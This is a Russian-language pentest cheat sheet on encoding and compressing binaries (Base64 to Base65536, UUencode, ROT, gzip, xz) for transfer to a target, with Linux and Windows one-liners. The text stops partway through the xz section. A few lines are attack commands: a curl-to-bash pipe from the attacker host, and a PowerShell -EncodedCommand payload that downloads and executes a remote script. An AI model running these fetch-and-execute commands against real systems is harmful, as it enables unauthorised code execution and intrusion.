# 10 - Encoding (кодировки и сжатие)

> [← README](../../README_RU.md) · [Следующий раздел →](11-encryption.md)

Когда сети нет вообще (есть только консоль / буфер обмена), или бинарь бьётся при передаче. Идея одна: **закодировать бинарь в текст -> перенести любым способом -> декодировать обратно**. Для передачи по сети - см. [01](01-attacker-to-target.md) / [02](02-target-to-attacker.md).

> Большинство CLI-инструментов - на Linux (обычно на стороне атакующего). Для Windows-цели самые надёжные - base64 через `certutil`/PowerShell. Экзотику (Base58/45/85, yEnc) удобнее гонять через Python.
>
> **Где выполнять:** команда `encode` запускается там, где лежит файл, а `decode` - на принимающей стороне. Метки `LHOST SHELL` / `RHOST SHELL` расставлены только в разделе Base64 (там наглядно); в остальных разделах `$LHOST` встречается лишь в строке **Download from server** - это наша раздача файла по HTTP, а сам pipeline выполняется на цели.

> **Шаблон каждого раздела:** `Linux` - **Encode -> Decode -> Download from server** (скачать и раскодировать одной строкой), `Windows` - **Encode / Decode** (PowerShell и/или CMD). `$LHOST` - наша машина, раздающая файл по HTTP (например, `python3 -m http.server 80`).

---

## Навигация

|  |  |
|---|---|
| [Шпаргалка «что чем»](#шпаргалка-что-чем) | [Часть 1. Кодировки / представления](#часть-1-кодировки--представления) |
| [Base64](#base64) | [Base64url (URL-safe)](#base64url-url-safe) |
| [Base32](#base32) | [Base32hex](#base32hex) |
| [Base16 / Hex](#base16--hex) | [Base58](#base58) |
| [Base45](#base45) | [Base91](#base91) |
| [Base62 (URL-safe)](#base62-url-safe) | [Base85 / Ascii85 / RFC1924 / Z85](#base85--ascii85--rfc1924--z85) |
| [Base2048 / Base32768 / Base65536 (Unicode-каналы)](#base2048--base32768--base65536-unicode-каналы) | [UUencode](#uuencode) |
| [yEnc](#yenc) | [Octal (восьмеричное представление)](#octal-восьмеричное-представление) |
| [UTF-16LE](#utf-16le) | [ROT (ROT13 / ROT47 / ROT18)](#rot-rot13--rot47--rot18) |
| [Часть 2. Сжатие / упаковка](#часть-2-сжатие--упаковка) | [gzip](#gzip) |
| [bzip2](#bzip2) | [xz / LZMA2](#xz--lzma2) |
| [zlib / DEFLATE (raw)](#zlib--deflate-raw) | [tar (упаковка каталогов)](#tar-упаковка-каталогов) |
| [ZIP](#zip) | [7z](#7z) |
| [zstd (Zstandard)](#zstd-zstandard) | [lz4](#lz4) |
| [brotli](#brotli) | [lzip / lrzip / lzop](#lzip--lrzip--lzop) |
| [compress (.Z) / bzip3 / snappy](#compress-z--bzip3--snappy) | [RAR](#rar) |
| [CAB / cpio / ar (редкие архивы)](#cab--cpio--ar-редкие-архивы) | [Часть 3. Веб / MIME / текстовые экранирования](#часть-3-веб--mime--текстовые-экранирования) |
| [URL-encoding (percent-encoding)](#url-encoding-percent-encoding) | [HTML entities](#html-entities) |
| [Quoted-printable](#quoted-printable) | [Punycode / IDN](#punycode--idn) |
| [Unicode-экранирование (`\uXXXX`, `\xNN`, UTF-7)](#unicode-экранирование-uxxxx-xnn-utf-7) | [PGP / MIME ASCII armor](#pgp--mime-ascii-armor) |
| [Часть 4. Классика и скрытые каналы](#часть-4-классика-и-скрытые-каналы) | [Atbash / Caesar (классические подстановки)](#atbash--caesar-классические-подстановки) |
| [Morse / A1Z26 / Binary / Decimal](#morse--a1z26--binary--decimal) | [Zero-width / Unicode-стеганография](#zero-width--unicode-стеганография) |
| [QR-код как канал](#qr-код-как-канал) | [Полный набор: `linenum.sh` во всех кодировках](#полный-набор-linenumsh-во-всех-кодировках) |
| [SOUNDCLOUD - доставка payload через публичное поле BIO](#soundcloud---доставка-payload-через-публичное-поле-bio) | [Интересные комбинации](#интересные-комбинации) |

## Флаги: быстрый разбор

Собрал здесь флаги, которые встречаются дальше. У разных утилит они не всегда значат одно и то же, так что сверяйтесь с разделом.

### OpenSSL `enc`

| Флаг | Что делает |
|---|---|
| `enc` | режим шифрования/расшифровки |
| `-aes-256-cbc` | алгоритм: AES-256 в режиме CBC |
| `-pbkdf2` | использовать PBKDF2 вместо legacy `EVP_BytesToKey` |
| `-iter 100000` | число итераций PBKDF2; больше = медленнее перебор |
| `-salt` | случайная соль в заголовке (в современных OpenSSL включена по умолчанию) |
| `-d` | decrypt |
| `-in FILE`, `-out FILE` | входной и выходной файлы |
| `-pass env:PASS` | пароль из переменной окружения; также `file:`, `fd:`, `stdin` |
| `-k 'pass'` | пароль прямо в командной строке: виден в `ps` и history, только для лаб |
| `-base64` | обернуть результат в base64 |
| `-md sha256` | digest для PBKDF2; в OpenSSL 1.1.1+ по умолчанию `sha256`, в старых - `md5` |
| `-nosalt` | без соли; не рекомендуется |

> **`-cbc` - режим, а не отдельный шифр.** `-aes-256-cbc` = AES-256 + CBC. CBC требует случайный IV и padding, **не даёт целостности**: без HMAC/AEAD можно менять шифртекст. Для новых систем лучше AEAD (GCM/ChaCha20-Poly1305). Подробнее - в [11 - Encryption](11-encryption.md#режимы-блочных-шифров).

### Кодировки и hex

| Команда | Флаг | Что делает |
|---|---|---|
| `base64` | `-w0` | без переносов строк |
| `base64` | `-d` | decode |
| `basenc` | `--base64url`, `--base32`, `--base32hex`, `--base16`, `--z85` | выбор алфавита |
| `basenc` | `-d` | decode |
| `xxd` | `-p` | plain hex dump |
| `xxd` | `-r -p` | reverse plain hex |
| `base32` | `-w0` | без переносов |
| `uuencode` | `IN NAME` | вход и имя файла в заголовке |
| `uudecode` | `-o FILE` | куда записать результат |

### Сжатие и архивы

| Команда | Флаг | Что делает |
|---|---|---|
| `gzip` / `bzip2` / `xz` | `-c` | писать в stdout |
| то же | `-d` | decompress |
| `gzip` / `bzip2` | `-k` | сохранить исходник |
| `gzip` / `bzip2` / `xz` | `-9`, `-9e` | максимум сжатия (`-9e` - extreme для xz) |
| `tar` | `c` / `x` | create / extract |
| `tar` | `f` | имя архива |
| `tar` | `z` / `J` / `--zstd` | gzip / xz / zstd |
| `tar` | `-C DIR` | распаковать в каталог |
| `zip` | `-r` | рекурсивно |
| `zip` | `-e` | запросить пароль |
| `zip` | `-P PASS` | пароль в командной строке (виден в `ps`) |
| `7z` | `a` / `x` | добавить / распаковать |
| `7z` | `-pPASS` | пароль |
| `7z` | `-mhe=on` | шифровать имена файлов |
| `7z` | `-mx=9` | максимум сжатия |
| `zstd` / `lz4` / `brotli` | `-d` | decompress |
| `zstd` | `-19`, `-T0` | максимум / все ядра |
| `lz4` | `-9` | максимум |
| `brotli` | `-q 11` | максимум качества |
| `rar` | `a` / `x` | добавить / распаковать |
| `rar` | `-hpPASS` | пароль + шифрование заголовков |
| `unrar` | `x` | распаковать с путями |

### HTTP и текст

| Команда | Флаг | Что делает |
|---|---|---|
| `curl` | `-s` | silent |
| `curl` | `-o FILE` | сохранить в файл |
| `curl` | `-H 'Name: value'` | добавить заголовок |
| `curl` | `--compressed` | принять gzip/deflate/br и распаковать |
| `python3 -c` | `quote(..., safe='')` | URL-encode всех символов |
| `python3 -c` | `unquote(...)` | URL-decode |
| `python3 -c` | `html.escape/unescape` | HTML entities |
| `python3 -c` | `quopri.encode/decode` | quoted-printable |
| `idn2` | `-d` | Punycode -> Unicode |
| `qrencode` | `-o FILE` | выходная картинка |
| `zbarimg` | `-q --raw` | только данные, без служебного вывода |

---

## Шпаргалка «что чем»

| Кодировка | Linux | Windows |
|-----------|----------|------------|
| Base64 | `base64` | `certutil`, PowerShell |
| Base64url | `basenc` | PowerShell |
| Base32 / Base32hex | `base32`, `basenc` | Python |
| Base16 / Hex | `xxd`, `basenc` | PowerShell, `Format-Hex` |
| Base58 / Base45 | Python | Python |
| Base62 / Base91 | Python | Python |
| Base85 / Ascii85 / RFC1924 | Python | Python |
| Z85 | `basenc` | Python |
| Base2048 / Base32768 / Base65536 | Python | Python |
| UUencode / XXencode / Yyencode | `uuencode`, `uudeview` | Python |
| Octal | `od`, Python | PowerShell |
| UTF-16LE | `iconv` | PowerShell |
| ROT13 / ROT47 / ROT18 | `tr` | PowerShell |
| URL / HTML / Quoted-printable | Python, `jq` | PowerShell, Python |
| Punycode / IDN | `idn2` | PowerShell |
| PGP / MIME ASCII armor | `gpg`, `openssl` | `gpg`, `certutil` |
| Morse / A1Z26 / Binary / Decimal | Python | Python |
| Zero-width / Unicode-стего | Python | Python |
| yEnc | Python | Python |

---

# Часть 1. Кодировки / представления

## Base64

Флаги: `-w0` - без переносов; `-d` - decode; `base64` читает stdin и пишет stdout.

Самый универсальный: есть везде, где есть `base64` или `certutil`.

### Linux

**Encode:**
```bash
base64 -w0 file.bin > file.b64
```

**Decode:**
```bash
base64 -d file.b64 > file.bin
```

**Download from server + decode (RHOST, без записи на диск):**
```bash
curl -s http://$LHOST/file.b64 | base64 -d > file.bin

# или сразу выполнить, не сохраняя:
curl -s http://$LHOST/linenum.b64 | base64 -d | bash
```

### Windows

**Encode - PowerShell:**
```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\file.bin"))
[IO.File]::WriteAllText("file.b64", $b64)
```

**Encode - CMD (certutil, с PEM-заголовками):**
```cmd
certutil -encode file.bin file.b64
```

**Decode - PowerShell:**
```powershell
$bytes = [Convert]::FromBase64String((Get-Content -Raw file.b64))
[IO.File]::WriteAllBytes("file.bin", $bytes)
```

**Decode - CMD (certutil):**
```cmd
certutil -decode file.b64 file.bin
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.b64" -OutFile file.b64
certutil -decode file.b64 file.bin
```

> `certutil -encode` добавляет `-----BEGIN CERTIFICATE-----` и переносит строки по 64 символа. `certutil -decode` это понимает, а GNU `base64 -d` на Linux - нет. Не смешивайте: кодировали certutil'ом - декодируйте certutil'ом (или срежьте заголовки и переводы строк).

---

## Base64url (URL-safe)

Флаги: `--base64url` - URL-safe алфавит; `-d` - decode.

Тот же base64, но `+/` заменены на `-_` и убран padding `=`. Не ломается в URL/именах файлов.

### Linux

**Encode:**
```bash
basenc --base64url file.bin > file.b64url
```

**Decode:**
```bash
basenc -d --base64url file.b64url > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b64url | basenc -d --base64url > file.bin
```

### Windows

**Encode - PowerShell:**
```powershell
$b = [Convert]::ToBase64String([IO.File]::ReadAllBytes("file.bin"))
$b.TrimEnd('=').Replace('+','-').Replace('/','_') | Set-Content file.b64url
```

**Decode - PowerShell:**
```powershell
$s = (Get-Content -Raw file.b64url).Trim().Replace('-','+').Replace('_','/')
switch ($s.Length % 4) { 2 { $s += '==' } 3 { $s += '=' } }
[IO.File]::WriteAllBytes("file.bin", [Convert]::FromBase64String($s))
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.b64url" -OutFile file.b64url
# затем decode-блок выше
```

---

## Base32

Флаги: `-w0` - без переносов; `-d` - decode; `basenc --base32` - тот же алфавит.

Только `A-Z` и `2-7` - переживает регистронезависимые каналы (например, ввод голосом/по телефону).

### Linux

**Encode:**
```bash
base32 -w0 file.bin > file.b32        # или: basenc --base32 file.bin > file.b32
```

**Decode:**
```bash
base32 -d file.b32 > file.bin         # или: basenc -d --base32 file.b32 > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b32 | base32 -d > file.bin
```

### Windows

Нативно инструмента нет - через Python.

**Encode:**
```powershell
python -c "import base64;print(base64.b32encode(open('file.bin','rb').read()).decode())" > file.b32
```

**Decode:**
```powershell
python -c "import base64;open('file.bin','wb').write(base64.b32decode(open('file.b32').read().strip()))"
```

**Download from server + decode:**
```powershell
iwr "http://${LHOST}/file.b32" -OutFile file.b32
python -c "import base64;open('file.bin','wb').write(base64.b32decode(open('file.b32').read().strip()))"
```

---

## Base32hex

Флаги: `--base32hex` - алфавит `0-9A-V`; `-d` - decode.

Вариант Base32 с «расширенным hex»-алфавитом (`0-9A-V`), сохраняет порядок сортировки.

### Linux

**Encode:**
```bash
basenc --base32hex file.bin > file.b32h
```

**Decode:**
```bash
basenc -d --base32hex file.b32h > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b32h | basenc -d --base32hex > file.bin
```

### Windows

Через Python (нужен 3.10+ для `b32hexencode`).

**Encode:**
```powershell
python -c "import base64;print(base64.b32hexencode(open('file.bin','rb').read()).decode())" > file.b32h
```

**Decode:**
```powershell
python -c "import base64;open('file.bin','wb').write(base64.b32hexdecode(open('file.b32h').read().strip()))"
```

---

## Base16 / Hex

Флаги: `xxd -p` - plain hex; `xxd -r -p` - reverse plain hex; `basenc --base16`/`-d` - то же.

### Linux

**Encode (через `xxd`):**
```bash
xxd -p file.bin | tr -d '\n' > file.hex
```

**Encode (через `basenc`):**
```bash
basenc --base16 file.bin > file.hex
```

**Decode:**
```bash
xxd -r -p file.hex > file.bin          # или: basenc -d --base16 file.hex > file.bin
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.hex | xxd -r -p > file.bin
```

### Windows

**Encode - PowerShell:**
```powershell
$bytes = [IO.File]::ReadAllBytes("file.bin")
($bytes | ForEach-Object { $_.ToString("x2") }) -join '' | Set-Content file.hex
```

**Decode - PowerShell:**
```powershell
$hex = (Get-Content file.hex -Raw) -replace '\s',''
$bytes = for ($i=0; $i -lt $hex.Length; $i+=2) { [Convert]::ToByte($hex.Substring($i,2),16) }
[IO.File]::WriteAllBytes("file.bin", $bytes)
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.hex" -OutFile file.hex
# затем decode-блок выше
```

**Посмотреть hex любого файла:**
```powershell
Format-Hex file.bin
```

---

## Base58

Флаги: у Python-функций флагов нет: `base58.b58encode()` / `b58decode()`; ведущие нулевые байты не сохраняются.

Bitcoin-алфавит - без похожих символов (`0OIl`), без `+/`. Компактнее hex. Только Python (Linux и Windows).

### Linux

```bash
pip install base58        # или CLI: apt install base58
```

**Encode:**
```bash
python3 -c "import base58,sys; sys.stdout.write(base58.b58encode(open('file.bin','rb').read()).decode())" > file.b58
```

**Decode:**
```bash
python3 -c "import base58; open('file.bin','wb').write(base58.b58decode(open('file.b58').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b58 | python3 -c "import sys,base58; sys.stdout.buffer.write(base58.b58decode(sys.stdin.buffer.read().strip()))" > file.bin
```

### Windows

```powershell
pip install base58
```

**Encode / Decode:**
```powershell
python -c "import base58;open('file.b58','w').write(base58.b58encode(open('file.bin','rb').read()).decode())"
python -c "import base58;open('file.bin','wb').write(base58.b58decode(open('file.b58').read().strip()))"
```

---

## Base45

Флаги: `base45.b45encode()` / `b45decode()`; алфавит рассчитан на QR/текстовые каналы.

RFC 9285 (используется, например, в QR-кодах EU Digital COVID Certificate). Нишевое, только Python.

### Linux

```bash
pip install base45
```

**Encode:**
```bash
python3 -c "import base45; print(base45.b45encode(open('file.bin','rb').read()).decode())" > file.b45
```

**Decode:**
```bash
python3 -c "import base45; open('file.bin','wb').write(base45.b45decode(open('file.b45').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b45 | python3 -c "import sys,base45; sys.stdout.buffer.write(base45.b45decode(sys.stdin.buffer.read().strip()))" > file.bin
```

### Windows

```powershell
pip install base45
```

**Encode / Decode:**
```powershell
python -c "import base45;open('file.b45','w').write(base45.b45encode(open('file.bin','rb').read()).decode())"
python -c "import base45;open('file.bin','wb').write(base45.b45decode(open('file.b45').read().strip()))"
```

---

## Base91

Флаги: `base91.b91encode()` / `b91decode()`; компактнее Base64, но меньше поддержки.

Плотнее Base64 (~23% короче), алфавит из 91 печатаемого ASCII. Удобно, когда важен каждый символ. Только Python.

### Linux

```bash
pip install base91
```

**Encode:**
```bash
python3 -c "import base91,sys; sys.stdout.write(base91.encode(open('file.bin','rb').read()))" > file.b91
```

**Decode:**
```bash
python3 -c "import base91; open('file.bin','wb').write(base91.decode(open('file.b91').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b91 | python3 -c "import sys,base91; sys.stdout.buffer.write(base91.decode(sys.stdin.read().strip()))" > file.bin
```

### Windows

```powershell
pip install base91
python -c "import base91;open('file.b91','w').write(base91.encode(open('file.bin','rb').read()))"
python -c "import base91;open('file.bin','wb').write(base91.decode(open('file.b91').read().strip()))"
```

---

## Base62 (URL-safe)

Флаги: `pybase62.b62encode()` / `b62decode()`; ведущие нулевые байты могут теряться.

`0-9A-Za-z` - только буквы и цифры, без `+/=` и `-_`. Классика для коротких токенов/ID в URL. Только Python.

### Linux

```bash
pip install pybase62
```

**Encode:**
```bash
python3 -c "import base62,sys; sys.stdout.write(base62.encodebytes(open('file.bin','rb').read()))" > file.b62
```

**Decode:**
```bash
python3 -c "import base62; open('file.bin','wb').write(base62.decodebytes(open('file.b62').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b62 | python3 -c "import sys,base62; sys.stdout.buffer.write(base62.decodebytes(sys.stdin.read().strip()))" > file.bin
```

### Windows

```powershell
pip install pybase62
python -c "import base62;open('file.b62','w').write(base62.encodebytes(open('file.bin','rb').read()))"
python -c "import base62;open('file.bin','wb').write(base62.decodebytes(open('file.b62').read().strip()))"
```

> Base58/Base62 не сохраняют ведущие нулевые байты (`pybase62`: `b'\x00'` -> `0` -> `b''`). Для бинарей либо добавляем маркер длины/хэш, либо берём Base64/Base91.

---

## Base85 / Ascii85 / RFC1924 / Z85

Флаги: Python - `base64.a85encode/a85decode`, `b85encode/b85decode`; `basenc --z85`/`-d --z85` - ZeroMQ-алфавит.

Семейство Base85 - на ~20% компактнее Base64. Разные алфавиты - важно кодировать и декодировать **одним и тем же**.

### Linux

**Ascii85 (Adobe, из PDF/PostScript):**
```bash
# encode
python3 -c "import base64,sys; sys.stdout.buffer.write(base64.a85encode(open('file.bin','rb').read()))" > file.a85
# decode
python3 -c "import base64; open('file.bin','wb').write(base64.a85decode(open('file.a85','rb').read()))"
```

**Base85 / RFC1924 (алфавит Git/Mercurial, `base64.b85encode`):**
```bash
# encode
python3 -c "import base64,sys; sys.stdout.buffer.write(base64.b85encode(open('file.bin','rb').read()))" > file.b85
# decode
python3 -c "import base64; open('file.bin','wb').write(base64.b85decode(open('file.b85','rb').read()))"
```

**Z85 (ZeroMQ):** через `basenc` - длина входа должна быть кратна 4 (для decode - кратна 5):
```bash
basenc --z85 file.bin > file.z85
basenc -d --z85 file.z85 > file.bin
```

**Download from server + decode:**
```bash
# Ascii85
curl -s http://$LHOST/file.a85 | python3 -c "import sys,base64; sys.stdout.buffer.write(base64.a85decode(sys.stdin.buffer.read()))" > file.bin
# Z85
curl -s http://$LHOST/file.z85 | basenc -d --z85 > file.bin
```

### Windows

Через Python (те же команды, `python` вместо `python3`).

**Ascii85:**
```powershell
python -c "import base64,sys;sys.stdout.buffer.write(base64.a85encode(open('file.bin','rb').read()))" > file.a85
python -c "import base64;open('file.bin','wb').write(base64.a85decode(open('file.a85','rb').read()))"
```

**Base85 / RFC1924:**
```powershell
python -c "import base64,sys;sys.stdout.buffer.write(base64.b85encode(open('file.bin','rb').read()))" > file.b85
python -c "import base64;open('file.bin','wb').write(base64.b85decode(open('file.b85','rb').read()))"
```

---

## Base2048 / Base32768 / Base65536 (Unicode-каналы)

Флаги: у Python-модулей флагов нет: `base2048.encode/decode`, `base32768.encode/decode`, `base65536.encode/decode`.

Кодируют данные **в Unicode-символы** - по 11/15/16 бит на символ. Для передачи через Twitter/Discord/чат, где важен размер в символах, а не в байтах. Только Python.

- **Base2048** - 11 бит/символ, оптимизирован под лимиты Twitter (около 385 байт на твит).
- **Base32768** - 15 бит/символ.
- **Base65536** - 16 бит/символ (2 байта на кодпоинт).

### Linux

```bash
pip install base2048 base32768 base65536
```

**Encode / Decode (Base2048; остальные - заменой имени модуля):**
```bash
# encode
python3 -c "import base2048,sys; sys.stdout.write(base2048.encode(open('file.bin','rb').read()))" > file.b2048
# decode
python3 -c "import base2048; open('file.bin','wb').write(base2048.decode(open('file.b2048',encoding='utf-8').read().strip()))"
```

**Base32768 / Base65536:**
```bash
python3 -c "import base32768,sys; sys.stdout.write(base32768.encode(open('file.bin','rb').read()))" > file.b32768
python3 -c "import base32768; open('file.bin','wb').write(base32768.decode(open('file.b32768',encoding='utf-8').read().strip()))"

python3 -c "import base65536,sys; sys.stdout.write(base65536.encode(open('file.bin','rb').read()))" > file.b65536
python3 -c "import base65536; open('file.bin','wb').write(base65536.decode(open('file.b65536',encoding='utf-8').read().strip()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.b2048 | python3 -c "import sys,base2048; sys.stdout.buffer.write(base2048.decode(sys.stdin.read().strip()))" > file.bin
```

### Windows

Через Python (те же команды, `python` вместо `python3`).

> Для «эмодзи-канала» это и есть самый компактный способ протащить бинарь через текст соцсети.

---

## UUencode

Флаги: `uuencode INPUT NAME` - имя файла попадает в заголовок; `uudecode -o FILE` - переопределить имя.

Классика Unix для пересылки бинарей по e-mail/Usenet. Из пакета `sharutils`.

### Linux

```bash
apt install sharutils
```

**Encode (второй аргумент - имя файла при распаковке):**
```bash
uuencode file.bin file.bin > file.uu
```

**Decode (имя берётся из заголовка):**
```bash
uudecode file.uu
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.uu -o file.uu && uudecode file.uu
```

**Decode без `uudecode`** (набор утилит не нужен):
```bash
# Python
python3 -c "import codecs; open('output.sh', 'wb').write(codecs.decode(open('linenum.uu', 'rb').read(), 'uu'))"
# Perl
perl -ne 'print unpack("u", $_)' linenum.uu > output.sh
```

**Родственники: XXencode / Yyencode / btoa** - те же идеи с другим алфавитом. Распознать и распаковать почти любой из них (а также uu/base64/yEnc) умеет `uudeview`:

```bash
apt install uudeview
uudeview file.uu          # автоопределение формата и распаковка
uudeview -i file.uu       # -i = интерактивный режим
```

### Windows

Через Python (те же однострочники, `python` вместо `python3`).

---

## yEnc

Флаги: `yenc.encode(in, out, size)` / `yenc.decode(in, out)`; это функции модуля, не CLI-флаги.

Двоичное кодирование Usenet (эффективнее UUencode). Редкое - нужен отдельный модуль/утилита.

### Linux

```bash
pip install yenc
```

**Encode:**
```bash
python3 -c "import yenc; yenc.encode(open('file.bin','rb'), open('file.ye','wb'), __import__('os').path.getsize('file.bin'))"
```

**Decode:**
```bash
python3 -c "import yenc; yenc.decode(open('file.ye','rb'), open('file.bin','wb'))"
```

### Windows

```powershell
pip install yenc
python -c "import yenc;yenc.encode(open('file.bin','rb'),open('file.ye','wb'),__import__('os').path.getsize('file.bin'))"
python -c "import yenc;yenc.decode(open('file.ye','rb'),open('file.bin','wb'))"
```

> Если модуль недоступен - в дистрибутивах бывают CLI `yencode` / `ydecode`.

---

## Octal (восьмеричное представление)

Флаги: `od -An -to1 -v` - octal-байты, без адресов и без подавления повторов; `printf` интерпретирует `\NNN`.

### Linux

**Encode:**
```bash
od -An -v -to1 file.bin | tr -s ' ' '\n' | grep . > file.oct
```

**Decode:**
```bash
python3 -c "open('file.bin','wb').write(bytes(int(x,8) for x in open('file.oct').read().split()))"
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.oct | python3 -c "import sys; open('file.bin','wb').write(bytes(int(x,8) for x in sys.stdin.read().split()))"
```

### Windows

**Encode - PowerShell:**
```powershell
$bytes = [IO.File]::ReadAllBytes("file.bin")
($bytes | ForEach-Object { [Convert]::ToString($_,8).PadLeft(3,'0') }) -join ' ' | Set-Content file.oct
```

**Decode - PowerShell:**
```powershell
$oct = (Get-Content file.oct -Raw).Split(" `t`r`n", [StringSplitOptions]::RemoveEmptyEntries)
[IO.File]::WriteAllBytes("file.bin", [byte[]]($oct | ForEach-Object { [Convert]::ToByte($_,8) }))
```

---

## UTF-16LE

Флаги: `iconv -f UTF-8 -t UTF-16LE` - из UTF-8 в UTF-16LE; для обратного поменяйте `-f` и `-t`.

Перекодировка текста (не сжатие). Часто нужна для PowerShell `-EncodedCommand` (он ждёт base64 от UTF-16LE).

### Linux

**Encode:**
```bash
iconv -f UTF-8 -t UTF-16LE in.txt > out.txt
```

**Decode:**
```bash
iconv -f UTF-16LE -t UTF-8 out.txt > in.txt
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.utf16 | iconv -f UTF-16LE -t UTF-8 > file.txt
```

**Payload для `powershell -EncodedCommand`:**
```bash
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://'"$LHOST"'/s.ps1")' | iconv -t UTF-16LE | base64 -w0
# затем на цели:  powershell -EncodedCommand <строка>
```

### Windows

**Encode - PowerShell:**
```powershell
[IO.File]::WriteAllText("out.txt", (Get-Content -Raw in.txt), [Text.Encoding]::Unicode)
```

**Decode - PowerShell:**
```powershell
[IO.File]::WriteAllText("in.txt", [IO.File]::ReadAllText("out.txt", [Text.Encoding]::Unicode))
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.utf16" -OutFile file.utf16
[IO.File]::WriteAllText("file.txt", [IO.File]::ReadAllText("file.utf16", [Text.Encoding]::Unicode))
```

---

## ROT (ROT13 / ROT47 / ROT18)

Флаги: `tr 'A-Za-z' 'N-ZA-Mn-za-m'` - ROT13; `tr '!-~' 'P-~!-O'` - ROT47; диапазоны задают сдвиг.

Символьная подстановка - обфускация, не шифрование. Само-обратима.

- **ROT13** - только буквы латиницы.
- **ROT47** - весь печатаемый ASCII (`!`-`~`), включая цифры и знаки.
- **ROT5** - только цифры. **ROT18** = ROT13 + ROT5.

### Linux

**ROT13 (encode = decode):**
```bash
echo "Secret Message" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**ROT47 (encode = decode):**
```bash
echo "Hello, World! 123" | tr '!-~' 'P-~!-O'
```

**ROT5 / ROT18:**
```bash
echo "12345" | tr '0-9' '5-90-4'                              # ROT5
echo "Secret 123" | tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'       # ROT18
```

**Download from server + decode:**
```bash
curl -s http://$LHOST/file.rot13 | tr 'A-Za-z' 'N-ZA-Mn-za-m' > file.txt
curl -s http://$LHOST/file.rot47 | tr '!-~' 'P-~!-O' > file.txt
```

### Windows

**ROT13 - PowerShell:**
```powershell
$map = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"
$out = -join ((Get-Content -Raw file.txt).ToCharArray() | ForEach-Object {
  if     ($_ -cmatch '[A-Z]') { $map[[int][char]$_ - 65] }
  elseif ($_ -cmatch '[a-z]') { $map[[int][char]$_ - 97 + 26] }
  else                        { $_ }
})
[IO.File]::WriteAllText("file.rot13", $out)
```

**ROT47 - PowerShell:**
```powershell
$out = -join ((Get-Content -Raw file.txt).ToCharArray() | ForEach-Object {
  $c = [int][char]$_
  if ($c -ge 33 -and $c -le 126) { [char](33 + (($c - 33 + 47) % 94)) } else { $_ }
})
[IO.File]::WriteAllText("file.rot47", $out)
```

---

# Часть 2. Сжатие / упаковка

Уменьшают объём (меньше копипастить/качать) и «склеивают» бинарь. Классический приём для текстового канала - **сжать и обернуть в base64**:

```bash
# упаковать -> текст
gzip -c file.bin | base64 -w0 > file.txt

# на приёмнике: текст -> распаковать
base64 -d file.txt | gunzip > file.bin
```

---

## gzip

Флаги: `-k` - оставить исходник; `-9` - максимум; `-c` - stdout; `-d` - decompress.

### Linux

**Encode (compress):**
```bash
gzip -k -9 file.bin              # -> file.bin.gz (-k = keep оригинал)
```

**Decode:**
```bash
gunzip file.bin.gz               # или: gzip -d file.bin.gz
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.gz | gunzip > file.bin
```

**Сжать -> base64 -> скачать -> распаковать:**
```bash
# LHOST: упаковать в текст
gzip -c file.bin | base64 -w0 > file.b64
# RHOST: забрать и распаковать на лету
curl -s http://$LHOST/file.b64 | base64 -d | gunzip > file.bin
```

### Windows

**Encode - PowerShell (.NET GZipStream):**
```powershell
$in  = [IO.File]::OpenRead("file.bin");  $out = [IO.File]::Create("file.bin.gz")
$gz  = New-Object IO.Compression.GZipStream($out, [IO.Compression.CompressionMode]::Compress)
$in.CopyTo($gz); $gz.Dispose(); $out.Dispose(); $in.Dispose()
```

**Decode - PowerShell:**
```powershell
$in  = [IO.File]::OpenRead("file.bin.gz"); $out = [IO.File]::Create("file.bin")
$gz  = New-Object IO.Compression.GZipStream($in, [IO.Compression.CompressionMode]::Decompress)
$gz.CopyTo($out); $out.Dispose(); $gz.Dispose(); $in.Dispose()
```

**Download from server + decode - PowerShell:**
```powershell
iwr "http://${LHOST}/file.b64" -OutFile file.b64
certutil -decode file.b64 file.bin.gz
# затем decode-блок выше
```

---

## bzip2

Флаги: `-k` - оставить исходник; `-9` - максимум; `-c` - stdout; `-d` - decompress.

Сильнее gzip, медленнее.

### Linux

**Encode:**
```bash
bzip2 -k file.bin                # -> file.bin.bz2
```

**Decode:**
```bash
bunzip2 file.bin.bz2             # или: bzip2 -d file.bin.bz2
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.bz2 | bunzip2 > file.bin
```

### Windows

Нативный `bzip2` встречается редко - используем `tar`/`7z` (см. ниже) или Python-модуль `bz2`:

```powershell
python -c "import bz2,shutil;shutil.copyfileobj(bz2.open('file.bin.bz2','rb'),open('file.bin','wb'))"
python -c "import bz2,shutil;shutil.copyfileobj(bz2.open('file.bin.bz2','wb'),open('file.bin','rb'))"
```

---

## xz / LZMA2

Флаги: `-k` - оставить исходник; `-9e` - максимум; `-c` - stdout; `-d` - decompress; `-T0` - все ядра.

Лучшее сжатие из «классики».

### Linux

**Encode:**
```bash
xz -k -9e file.bin               # -> file.bin.xz  (-9e = максимум)
```

**Decode:**
```bash
unxz file.bin.xz                 # или: xz -d file.bin.xz
```

**Download from server + decompress:**
```bash
curl -s http://$LHOST/file.bin.xz | xz -d > file.bin
```

**Сжать -> base64 -> скачать -> распаковать:**
```bash
# LHOST
xz -9 < linenum.sh | base64 -w0 > linenum.sh.xz.b64
# RHOST
